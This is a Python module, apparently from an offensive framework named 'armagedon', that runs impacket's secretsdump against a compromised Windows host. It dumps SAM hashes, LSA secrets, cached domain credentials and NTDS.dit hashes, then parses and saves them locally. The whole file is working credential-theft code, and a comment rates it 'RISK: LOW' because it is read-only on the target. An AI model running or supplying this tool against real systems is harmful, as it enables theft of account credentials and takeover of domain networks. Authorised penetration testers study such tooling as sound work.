"""Post-Exploitation — Credential Dump.

Dumps password hashes and credentials from a compromised Windows host
using secretsdump (SAM, LSA, NTDS.dit) and mimikatz-like techniques.
"""

import subprocess
import shutil
import re
import logging
import os

log = logging.getLogger("armagedon.modules.post.credential_dump")

# ── SAFETY NOTE ─────────────────────────────────────────────────────────
# This module is READ-ONLY on the target system. It reads credential
# stores but does NOT modify them. Hashes are saved locally.
# RISK: LOW — no target system modification.
# ────────────────────────────────────────────────────────────────────────

NAME = "Credential Dump"
DESCRIPTION = "Dump SAM hashes, LSA secrets, cached creds, and NTDS.dit"


def run(options=None, target=None, mode="CHECK", **kwargs):
    if options is None:
        options = {}
    rhosts = target or options.get("RHOSTS", "")
    timeout = int(options.get("TIMEOUT", 30))
    smb_user = options.get("SMB_USER", "")
    smb_pass = options.get("SMB_PASS", "")
    smb_domain = options.get("SMB_DOMAIN", "")
    output_dir = options.get("OUTPUT_DIR", "/tmp/armagedon_creds")

    log.info(f"Credential dump run against {rhosts} mode={mode}")

    result = {
        "success": False,
        "technique": NAME,
        "target": rhosts,
        "mode": mode,
        "data": {},
        "error": None,
    }

    if not rhosts or not smb_user or not smb_pass:
        result["error"] = "RHOSTS, SMB_USER, SMB_PASS required"
        log.error(result["error"])
        return result

    cmd = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
    if not cmd:
        result["error"] = "impacket-secretsdump not found"
        log.error(result["error"])
        return result

    auth = f"{smb_domain}/{smb_user}:{smb_pass}" if smb_domain else f"{smb_user}:{smb_pass}"

    if mode == "CHECK":
        result["success"] = True
        result["data"]["status"] = "secretsdump available — ready to dump credentials"
        result["data"]["tool"] = cmd
        return result

    elif mode == "EXPLOIT":
        try:
            import os
            os.makedirs(output_dir, exist_ok=True)

            creds = {"sam": [], "lsa": [], "cached": [], "ntds": []}

            # SAM + SYSTEM dump
            print(f"  [*] Dumping SAM hashes...")
            try:
                p = subprocess.run(
                    [cmd, f"{auth}@{rhosts}",
                     "-sam", "SAM", "-system", "SYSTEM", "-outputfile",
                     f"{output_dir}/sam.txt"],
                    capture_output=True, text=True, timeout=timeout,
                )
                out = p.stdout + p.stderr
                # Parse hash lines
                for line in out.splitlines():
                    if ":" in line and ("$" in line or "Administrator" in line):
                        creds["sam"].append(line.strip())
                print(f"  [+] SAM: {len(creds['sam'])} hashes")
            except subprocess.TimeoutExpired:
                print(f"  [-] SAM dump timed out")

            # LSA secrets
            print(f"  [*] Dumping LSA secrets...")
            try:
                p = subprocess.run(
                    [cmd, f"{auth}@{rhosts}", "-lsadump"],
                    capture_output=True, text=True, timeout=timeout,
                )
                out = p.stdout + p.stderr
                for line in out.splitlines():
                    if any(x in line.lower() for x in ["defaultpassword", "gmsa", "dpapi"]):
                        creds["lsa"].append(line.strip())
                print(f"  [+] LSA: {len(creds['lsa'])} secrets")
            except subprocess.TimeoutExpired:
                print(f"  [-] LSA dump timed out")

            # Cached domain credentials
            print(f"  [*] Dumping cached credentials...")
            try:
                p = subprocess.run(
                    [cmd, f"{auth}@{rhosts}", "-cached"],
                    capture_output=True, text=True, timeout=timeout,
                )
                out = p.stdout + p.stderr
                for line in out.splitlines():
                    if "$DCC2$" in line or "mscash" in line.lower():
                        creds["cached"].append(line.strip())
                print(f"  [+] Cached: {len(creds['cached'])} entries")
            except subprocess.TimeoutExpired:
                print(f"  [-] Cached dump timed out")

            # NTDS.dit (DC only)
            print(f"  [*] Attempting NTDS.dit extraction...")
            try:
                p = subprocess.run(
                    [cmd, f"{auth}@{rhosts}", "-ntds", "ntds.dit", "-system", "SYSTEM",
                     "-outputfile", f"{output_dir}/ntds.txt"],
                    capture_output=True, text=True, timeout=timeout * 2,
                )
                out = p.stdout + p.stderr
                for line in out.splitlines():
                    if ":" in line and "$" in line:
                        creds["ntds"].append(line.strip())
                print(f"  [+] NTDS: {len(creds['ntds'])} hashes")
            except subprocess.TimeoutExpired:
                print(f"  [-] NTDS dump timed out (may not be a DC)")

            total = sum(len(v) for v in creds.values())

            result["success"] = total > 0
            result["data"]["total_credentials"] = total
            result["data"]["sam_hashes"] = creds["sam"]
            result["data"]["lsa_secrets"] = creds["lsa"]
            result["data"]["cached_credentials"] = creds["cached"]
            result["data"]["ntds_hashes"] = creds["ntds"]
            result["data"]["output_dir"] = output_dir

        except Exception as e:
            result["error"] = str(e)

    return result
